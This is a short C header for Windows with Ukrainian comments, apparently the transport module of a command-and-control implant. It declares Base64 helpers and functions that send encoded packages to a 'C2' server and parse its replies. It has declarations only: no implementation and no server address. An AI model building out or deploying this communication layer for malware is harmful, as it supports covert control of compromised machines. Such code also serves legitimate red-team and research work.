#ifndef TRANSPORT_H
#define TRANSPORT_H

#include <windows.h>
#include "Parser.h"
#include "Package.h"

// Кодує буфер у Base64. Caller звільняє.
PCHAR  b64Encode(const PBYTE data, SIZE_T len);
// Декодує Base64. Caller звільняє.
PBYTE  b64Decode(PCHAR input, PSIZE_T outLen);
// Розмір Base64 для вхідного буфера.
SIZE_T b64EncodedSize(SIZE_T inputLen);

// Відправляє Base64-дані на C2, повертає Parser із декодованою відповіддю.
PParser sendAndReceive(PBYTE data, SIZE_T size);

// Зручна обгортка: кодує Package -> Base64 -> sendAndReceive.
PParser sendPackage(PPackage package);

#endif